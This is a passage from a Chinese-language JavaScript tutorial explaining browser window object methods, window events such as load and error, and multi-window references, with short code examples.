<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> windowB = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;windowB.html&#x27;</span>, <span class="string">&#x27;WindowB&#x27;</span>);</span><br><span class="line">windowB.<span class="property">window</span>.<span class="property">name</span> <span class="comment">// &quot;WindowB&quot;</span></span><br></pre></td></tr></table></figure>

<p>注意，如果新窗口和父窗口不是同源的（即不在同一个域），它们彼此不能获取对方窗口对象的内部属性。</p>
<p>下面是另一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> w = <span class="variable language_">window</span>.<span class="title function_">open</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;已经打开新窗口&#x27;</span>);</span><br><span class="line">w.<span class="property">location</span> = <span class="string">&#x27;http://example.com&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>上面代码先打开一个新窗口，然后在该窗口弹出一个对话框，再将网址导向<code>example.com</code>。</p>
<p>由于<code>open</code>这个方法很容易被滥用，许多浏览器默认都不允许脚本自动新建窗口。只允许在用户点击链接或按钮时，脚本做出反应，弹出新窗口。因此，有必要检查一下打开新窗口是否成功。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> popup = <span class="variable language_">window</span>.<span class="title function_">open</span>();</span><br><span class="line"><span class="keyword">if</span> (popup === <span class="literal">null</span>) &#123;</span><br><span class="line">  <span class="comment">// 新建窗口失败</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>（2）window.close()关闭当前窗口</strong></p>
<p><code>window.close</code>方法用于<strong>关闭当前窗口</strong>，<strong>一般只用来关闭<code>window.open</code>方法新建的窗口。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popup.<span class="title function_">close</span>()</span><br></pre></td></tr></table></figure>

<p>该方法只对顶层窗口有效，<code>iframe</code>框架之中的窗口使用该方法无效。</p>
<p><strong>（3）window.stop() 停止加载网页</strong></p>
<p><code>window.stop()</code>方法完全等同于单击浏览器的停止按钮，会停止加载图像、视频等正在或等待加载的对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">stop</span>()</span><br></pre></td></tr></table></figure>



<h4 id="3-3-window-moveTo-移动窗口，window-moveBy-移动窗口到相对位置"><a href="#3-3-window-moveTo-移动窗口，window-moveBy-移动窗口到相对位置" class="headerlink" title="3.3 window.moveTo() 移动窗口，window.moveBy() 移动窗口到相对位置"></a>3.3 window.moveTo() 移动窗口，window.moveBy() 移动窗口到相对位置</h4><p><code>window.moveTo()</code>方法用于<strong>移动浏览器窗口到指定位置</strong>。它接受两个参数，分别是窗口左上角距离屏幕左上角的水平距离和垂直距离，单位为像素。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">moveTo</span>(<span class="number">100</span>, <span class="number">200</span>)</span><br></pre></td></tr></table></figure>

<p>上面代码将窗口移动到屏幕<code>(100, 200)</code>的位置。</p>
<p><code>window.moveBy()</code>方法<strong>将窗口移动到一个相对位置</strong>。它接受两个参数，分别是窗口左上角向右移动的水平距离和向下移动的垂直距离，单位为像素。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">moveBy</span>(<span class="number">25</span>, <span class="number">50</span>)</span><br></pre></td></tr></table></figure>

<p>上面代码将窗口向右移动25像素、向下移动50像素。</p>
<p>为了防止有人滥用这两个方法，随意移动用户的窗口，目前只有一种情况，浏览器允许用脚本移动窗口：该窗口是用<code>window.open()</code>方法新建的，并且窗口里只有它一个 Tab 页。除此以外的情况，使用上面两个方法都是无效的。</p>
<h4 id="3-4-window-resizeTo-缩放窗口到，window-resizeBy-缩放窗口-相对大小"><a href="#3-4-window-resizeTo-缩放窗口到，window-resizeBy-缩放窗口-相对大小" class="headerlink" title="3.4 window.resizeTo() 缩放窗口到，window.resizeBy() 缩放窗口-相对大小"></a>3.4 window.resizeTo() 缩放窗口到，window.resizeBy() 缩放窗口-相对大小</h4><p><code>window.resizeTo()</code>方法用于<strong>缩放窗口到指定大小</strong>。</p>
<p>它接受两个参数，第一个是缩放后的窗口宽度（<code>outerWidth</code>属性，包含滚动条、标题栏等等），第二个是缩放后的窗口高度（<code>outerHeight</code>属性）。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">resizeTo</span>(</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">availWidth</span> / <span class="number">2</span>,</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">availHeight</span> / <span class="number">2</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>上面代码将当前窗口缩放到，屏幕可用区域的一半宽度和高度。</p>
<p><code>window.resizeBy()</code>方法用于缩放窗口。它与<code>window.resizeTo()</code>的区别是，它按照相对的量缩放，<code>window.resizeTo()</code>需要给出缩放后的绝对大小。</p>
<p>它接受两个参数，第一个是水平缩放的量，第二个是垂直缩放的量，单位都是像素。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">resizeBy</span>(-<span class="number">200</span>, -<span class="number">200</span>)</span><br></pre></td></tr></table></figure>

<p>上面的代码将当前窗口的宽度和高度，都缩小200像素。</p>
<blockquote>
<p>笔记：resizeTo是把窗口缩放到指定大小，而resizeBy是相对缩放多少大小</p>
</blockquote>
<h4 id="3-5-window-scrollTo-，window-scroll-，window-scrollBy"><a href="#3-5-window-scrollTo-，window-scroll-，window-scrollBy" class="headerlink" title="3.5 window.scrollTo()，window.scroll()，window.scrollBy()"></a>3.5 window.scrollTo()，window.scroll()，window.scrollBy()</h4><p><code>window.scrollTo</code>方法用于<strong>将文档滚动到指定位置</strong>。它接受两个参数，表示滚动后位于窗口左上角的页面坐标。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(x-coord, y-coord)</span><br></pre></td></tr></table></figure>

<p>它也可以接受一个配置对象作为参数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(options)</span><br></pre></td></tr></table></figure>

<p>配置对象<code>options</code>有三个属性。</p>
<ul>
<li><code>top</code>：滚动后页面左上角的垂直坐标，即 y 坐标。</li>
<li><code>left</code>：滚动后页面左上角的水平坐标，即 x 坐标。</li>
<li><code>behavior</code>：字符串，表示滚动的方式，有三个可能值（<code>smooth</code>、<code>instant</code>、<code>auto</code>），默认值为<code>auto</code>。</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(&#123;</span><br><span class="line">  <span class="attr">top</span>: <span class="number">1000</span>,</span><br><span class="line">  <span class="attr">behavior</span>: <span class="string">&#x27;smooth&#x27;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><strong><code>window.scroll()</code>方法是<code>window.scrollTo()</code>方法的别名。</strong></p>
<p><code>window.scrollBy()</code>方法<strong>用于将网页滚动指定距离</strong>（单位像素）。它接受两个参数：水平向右滚动的像素，垂直向下滚动的像素。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">scrollBy</span>(<span class="number">0</span>, <span class="variable language_">window</span>.<span class="property">innerHeight</span>)</span><br></pre></td></tr></table></figure>

<p>上面代码用于将网页向下滚动一屏。</p>
<p>如果不是要滚动整个文档，而是要<strong>滚动某个元素，可以使用下面三个属性和方法</strong>。</p>
<ul>
<li>Element.scrollTop</li>
<li>Element.scrollLeft</li>
<li>Element.scrollIntoView()</li>
</ul>
<h4 id="3-6-window-print-打印机对话框"><a href="#3-6-window-print-打印机对话框" class="headerlink" title="3.6 window.print() 打印机对话框"></a>3.6 window.print() 打印机对话框</h4><p><code>window.print</code>方法会<strong>跳出打印对话框</strong>，与用户点击菜单里面的“打印”命令效果相同。</p>
<p>常见的打印按钮代码如下。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;printLink&#x27;</span>).<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">print</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>非桌面设备（比如手机）可能没有打印功能，这时可以这样判断。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="variable language_">window</span>.<span class="property">print</span> === <span class="string">&#x27;function&#x27;</span>) &#123;</span><br><span class="line">  <span class="comment">// 支持打印功能</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-7-window-focus-，window-blur"><a href="#3-7-window-focus-，window-blur" class="headerlink" title="3.7 window.focus()，window.blur()"></a>3.7 window.focus()，window.blur()</h4><p><code>window.focus()</code>方法会激活窗口，使其获得焦点，出现在其他窗口的前面。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> popup = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;popup.html&#x27;</span>, <span class="string">&#x27;Popup Window&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((popup !== <span class="literal">null</span>) &amp;&amp; !popup.<span class="property">closed</span>) &#123;</span><br><span class="line">  popup.<span class="title function_">focus</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码先检查<code>popup</code>窗口是否依然存在，确认后激活该窗口。</p>
<p><code>window.blur()</code>方法将焦点从窗口移除。</p>
<p>当前窗口获得焦点时，会触发<code>focus</code>事件；当前窗口失去焦点时，会触发<code>blur</code>事件。</p>
<h4 id="3-8-window-getSelection-获取用户选中文本"><a href="#3-8-window-getSelection-获取用户选中文本" class="headerlink" title="3.8 window.getSelection() 获取用户选中文本"></a>3.8 window.getSelection() 获取用户选中文本</h4><p><code>window.getSelection</code>方法返回一个<code>Selection</code>对象，表示<strong>用户现在选中的文本</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> selObj = <span class="variable language_">window</span>.<span class="title function_">getSelection</span>();</span><br></pre></td></tr></table></figure>

<p>使用<code>Selection</code>对象的<code>toString</code>方法可以得到选中的文本。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> selectedText = selObj.<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure>



<h4 id="3-9-window-getComputedStyle-返回元素最终样式，window-matchMedia"><a href="#3-9-window-getComputedStyle-返回元素最终样式，window-matchMedia" class="headerlink" title="3.9 window.getComputedStyle() 返回元素最终样式，window.matchMedia()"></a>3.9 window.getComputedStyle() 返回元素最终样式，window.matchMedia()</h4><p><code>window.getComputedStyle()</code>方法接受一个元素节点作为参数，返回一个<strong>包含该元素的最终样式信息的对象</strong>，详见《CSS 操作》一章。</p>
<p><code>window.matchMedia()</code>方法<strong>用来检查 CSS 的<code>mediaQuery</code>语句</strong>，详见《CSS 操作》一章。</p>
<h4 id="3-10-window-requestAnimationFrame-将回调函数推迟到重流时执行"><a href="#3-10-window-requestAnimationFrame-将回调函数推迟到重流时执行" class="headerlink" title="3.10 window.requestAnimationFrame() 将回调函数推迟到重流时执行"></a>3.10 window.requestAnimationFrame() 将回调函数推迟到重流时执行</h4><p><code>window.requestAnimationFrame()</code>方法<strong>跟<code>setTimeout</code>类似</strong>，<strong>都是推迟某个函数的执行</strong>。不同之处在于，<code>setTimeout</code>必须指定推迟的时间，<code>window.requestAnimationFrame()</code>则是<strong>推迟到浏览器下一次重流时执行，</strong>执行完才会进行下一次重绘。重绘通常是 16ms 执行一次，不过浏览器会自动调节这个速率，比如网页切换到后台 Tab 页时，<code>requestAnimationFrame()</code>会暂停执行。</p>
<p>如果某个函数会改变网页的布局，一般就放在<code>window.requestAnimationFrame()</code>里面执行，这样可以节省系统资源，使得网页效果更加平滑。因为慢速设备会用较慢的速率重流和重绘，而速度更快的设备会有更快的速率。</p>
<p>该方法<strong>接受一个回调函数作为参数</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">requestAnimationFrame</span>(callback)</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>callback</code>是一个回调函数。<code>callback</code>执行时，它的参数就是系统传入的一个高精度时间戳（<code>performance.now()</code>的返回值），单位是毫秒，表示距离网页加载的时间。</p>
<p><code>window.requestAnimationFrame()</code>的返回值是一个整数，这个整数可以传入<code>window.cancelAnimationFrame()</code>，用来取消回调函数的执行。</p>
<p>下面是一个<code>window.requestAnimationFrame()</code>执行网页动画的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;animate&#x27;</span>);</span><br><span class="line">element.<span class="property">style</span>.<span class="property">position</span> = <span class="string">&#x27;absolute&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> start = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">step</span>(<span class="params">timestamp</span>) &#123; <span class="comment">// timestamp距离网页加载完成的时间戳</span></span><br><span class="line">  <span class="keyword">if</span> (!start) start = timestamp;</span><br><span class="line">  <span class="keyword">var</span> progress = timestamp - start;</span><br><span class="line">  <span class="comment">// 元素不断向右移，最大不超过200像素</span></span><br><span class="line">  element.<span class="property">style</span>.<span class="property">left</span> = <span class="title class_">Math</span>.<span class="title function_">min</span>(progress / <span class="number">10</span>, <span class="number">200</span>) + <span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">  <span class="comment">// 如果距离第一次执行不超过 2000 毫秒，</span></span><br><span class="line">  <span class="comment">// 就继续执行动画</span></span><br><span class="line">  <span class="keyword">if</span> (progress &lt; <span class="number">2000</span>) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">requestAnimationFrame</span>(step);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">requestAnimationFrame</span>(step);</span><br></pre></td></tr></table></figure>

<p>上面代码定义了一个网页动画，持续时间是2秒，会让元素向右移动。</p>
<h4 id="3-11-window-requestIdleCallback-将回调函数推迟到系统空闲时执行"><a href="#3-11-window-requestIdleCallback-将回调函数推迟到系统空闲时执行" class="headerlink" title="3.11 window.requestIdleCallback() 将回调函数推迟到系统空闲时执行"></a>3.11 window.requestIdleCallback() 将回调函数推迟到系统空闲时执行</h4><p><code>window.requestIdleCallback()</code><strong>跟<code>setTimeout</code>类似，也是将某个函数推迟执行，但是它保证将回调函数推迟到系统资源空闲时执行。</strong>也就是说，如果某个任务不是很关键，就可以使用<code>window.requestIdleCallback()</code>将其推迟执行，以保证网页性能。</p>
<p>它跟<code>window.requestAnimationFrame()</code>的区别在于，后者指定回调函数在下一次浏览器重排时执行，问题在于下一次重排时，系统资源未必空闲，不一定能保证在16毫秒之内完成；<code>window.requestIdleCallback()</code>可以保证回调函数在系统资源空闲时执行。</p>
<p>该方法接受一个回调函数和一个配置对象作为参数。配置对象可以指定一个推迟执行的最长时间，如果过了这个时间，回调函数不管系统资源有无空虚，都会执行。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">requestIdleCallback</span>(callback[, options])</span><br></pre></td></tr></table></figure>

<p><code>callback</code>参数是一个回调函数。该回调函数执行时，系统会传入一个<code>IdleDeadline</code>对象作为参数。<code>IdleDeadline</code>对象有一个<code>didTimeout</code>属性（布尔值，表示是否为超时调用）和一个<code>timeRemaining()</code>方法（返回该空闲时段剩余的毫秒数）。</p>
<p><code>options</code>参数是一个配置对象，目前只有<code>timeout</code>一个属性，用来指定回调函数推迟执行的最大毫秒数。该参数可选。</p>
<p><code>window.requestIdleCallback()</code>方法返回一个整数。该整数可以传入<code>window.cancelIdleCallback()</code>取消回调函数。</p>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">requestIdleCallback</span>(myNonEssentialWork);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myNonEssentialWork</span>(<span class="params">deadline</span>) &#123;</span><br><span class="line">  <span class="keyword">while</span> (deadline.<span class="title function_">timeRemaining</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="title function_">doWorkIfNeeded</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>requestIdleCallback()</code>用来执行非关键任务<code>myNonEssentialWork</code>。该任务先确认本次空闲时段有剩余时间，然后才真正开始执行任务。</p>
<p>下面是指定<code>timeout</code>的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">requestIdleCallback</span>(processPendingAnalyticsEvents, &#123; <span class="attr">timeout</span>: <span class="number">2000</span> &#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码指定，<code>processPendingAnalyticsEvents</code>必须在未来2秒之内执行。</p>
<p>如果由于超时导致回调函数执行，则<code>deadline.timeRemaining()</code>返回<code>0</code>，<code>deadline.didTimeout</code>返回<code>true</code>。</p>
<p>如果多次执行<code>window.requestIdleCallback()</code>，指定多个回调函数，那么这些回调函数将排成一个队列，按照先进先出的顺序执行。</p>
<h3 id="4、事件"><a href="#4、事件" class="headerlink" title="4、事件"></a>4、事件</h3><p><code>window</code>对象可以接收以下事件。</p>
<h4 id="4-1-load-事件和-onload-属性"><a href="#4-1-load-事件和-onload-属性" class="headerlink" title="4.1 load 事件和 onload 属性"></a>4.1 load 事件和 onload 属性</h4><p><code>load</code>事件发生在文档在浏览器窗口加载完毕时。<code>window.onload</code>属性可以指定这个事件的回调函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> elements = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;example&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; elements.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> elt = elements[i];</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码在网页加载完毕后，获取指定元素并进行处理。</p>
<h4 id="4-2-error-事件和-onerror-属性"><a href="#4-2-error-事件和-onerror-属性" class="headerlink" title="4.2 error 事件和 onerror 属性"></a>4.2 error 事件和 onerror 属性</h4><p>浏览器脚本发生错误时，会触发<code>window</code>对象的<code>error</code>事件。我们可以通过<code>window.onerror</code>属性对该事件指定回调函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span> (<span class="params">message, filename, lineno, colno, error</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;出错了！--&gt; %s&quot;</span>, error.<span class="property">stack</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>由于历史原因，<code>window</code>的<code>error</code>事件的回调函数不接受错误对象作为参数，而是一共可以接受五个参数，它们的含义依次如下。</p>
<ul>
<li>出错信息</li>
<li>出错脚本的网址</li>
<li>行号</li>
<li>列号</li>
<li>错误对象</li>
</ul>
<p>老式浏览器只支持前三个参数。</p>
<p>并不是所有的错误，都会触发 JavaScript 的<code>error</code>事件（即让 JavaScript 报错）。一般来说，只有 JavaScript 脚本的错误，才会触发这个事件，而像资源文件不存在之类的错误，都不会触发。</p>
<p>下面是一个例子，如果整个页面未捕获错误超过3个，就显示警告。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params">msg, url, line</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (onerror.<span class="property">num</span>++ &gt; onerror.<span class="property">max</span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;ERROR: &#x27;</span> + msg + <span class="string">&#x27;\n&#x27;</span> + url + <span class="string">&#x27;:&#x27;</span> + line);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">onerror.<span class="property">max</span> = <span class="number">3</span>;</span><br><span class="line">onerror.<span class="property">num</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>需要注意的是，如果脚本网址与网页网址不在同一个域（比如使用了 CDN），浏览器根本不会提供详细的出错信息，只会提示出错，错误类型是“Script error.”，行号为0，其他信息都没有。这是浏览器防止向外部脚本泄漏信息。一个解决方法是在脚本所在的服务器，设置<code>Access-Control-Allow-Origin</code>的 HTTP 头信息。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Access</span>-<span class="title class_">Control</span>-<span class="title class_">Allow</span>-<span class="title class_">Origin</span>: *</span><br></pre></td></tr></table></figure>

<p>然后，在网页的&#96;&#96;标签中设置<code>crossorigin</code>属性。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//example.com/file.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码的<code>crossorigin=&quot;anonymous&quot;</code>表示，读取文件不需要身份信息，即不需要 cookie 和 HTTP 认证信息。如果设为<code>crossorigin=&quot;use-credentials&quot;</code>，就表示浏览器会上传 cookie 和 HTTP 认证信息，同时还需要服务器端打开 HTTP 头信息<code>Access-Control-Allow-Credentials</code>。</p>
<h4 id="4-3-window-对象的事件监听属性"><a href="#4-3-window-对象的事件监听属性" class="headerlink" title="4.3 window 对象的事件监听属性"></a>4.3 window 对象的事件监听属性</h4><p>除了具备元素节点都有的 GlobalEventHandlers 接口，<code>window</code>对象还具有以下的事件监听函数属性。</p>
<ul>
<li><code>window.onafterprint</code>：<code>afterprint</code>事件的监听函数。</li>
<li><code>window.onbeforeprint</code>：<code>beforeprint</code>事件的监听函数。</li>
<li><code>window.onbeforeunload</code>：<code>beforeunload</code>事件的监听函数。</li>
<li><code>window.onhashchange</code>：<code>hashchange</code>事件的监听函数。</li>
<li><code>window.onlanguagechange</code>: <code>languagechange</code>的监听函数。</li>
<li><code>window.onmessage</code>：<code>message</code>事件的监听函数。</li>
<li><code>window.onmessageerror</code>：<code>MessageError</code>事件的监听函数。</li>
<li><code>window.onoffline</code>：<code>offline</code>事件的监听函数。</li>
<li><code>window.ononline</code>：<code>online</code>事件的监听函数。</li>
<li><code>window.onpagehide</code>：<code>pagehide</code>事件的监听函数。</li>
<li><code>window.onpageshow</code>：<code>pageshow</code>事件的监听函数。</li>
<li><code>window.onpopstate</code>：<code>popstate</code>事件的监听函数。</li>
<li><code>window.onstorage</code>：<code>storage</code>事件的监听函数。</li>
<li><code>window.onunhandledrejection</code>：未处理的 Promise 对象的<code>reject</code>事件的监听函数。</li>
<li><code>window.onunload</code>：<code>unload</code>事件的监听函数。</li>
</ul>
<h3 id="5、多窗口操作"><a href="#5、多窗口操作" class="headerlink" title="5、多窗口操作"></a>5、多窗口操作</h3><p>由于网页可以使用<code>iframe</code>元素，嵌入其他网页，因此一个网页之中会形成多个窗口。如果子窗口之中又嵌入别的网页，就会形成多级窗口。</p>
<h4 id="5-1-窗口的引用"><a href="#5-1-窗口的引用" class="headerlink" title="5.1 窗口的引用"></a>5.1 窗口的引用</h4><p>各个窗口之中的脚本，可以引用其他窗口。浏览器提供了一些特殊变量，用来返回其他窗口。</p>
<ul>
<li><code>top</code>：顶层窗口，即最上层的那个窗口</li>
<li><code>parent</code>：父窗口</li>
<li><code>self</code>：当前窗口，即自身</li>
</ul>
<p>下面代码可以判断，当前窗口是否为顶层窗口。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">top</span> === <span class="variable language_">window</span>.<span class="property">self</span>) &#123;</span><br><span class="line">  <span class="comment">// 当前窗口是顶层窗口</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 当前窗口是子窗口</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面的代码让父窗口的访问历史后退一次。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">history</span>.<span class="title function_">back</span>();</span><br></pre></td></tr></table></figure>

<p>与这些变量对应，浏览器还提供一些特殊的窗口名，供<code>window.open()</code>方法、<code> &lt;a&gt; </code>标签、<code>&lt;form&gt;</code>标签等引用。</p>
<ul>
<li><code>_top</code>：顶层窗口</li>
<li><code>_parent</code>：父窗口</li>
<li><code>_blank</code>：新窗口</li>
</ul>
<p>下面代码就表示在顶层窗口打开链接。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;somepage.html&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_top&quot;</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="5-2-iframe-元素"><a href="#5-2-iframe-元素" class="headerlink" title="5.2 iframe 元素"></a>5.2 iframe 元素</h4><p>对于<code>iframe</code>嵌入的窗口，<code>document.getElementById</code>方法可以拿到该窗口的 DOM 节点，然后使用<code>contentWindow</code>属性获得<code>iframe</code>节点包含的<code>window</code>对象。</p>
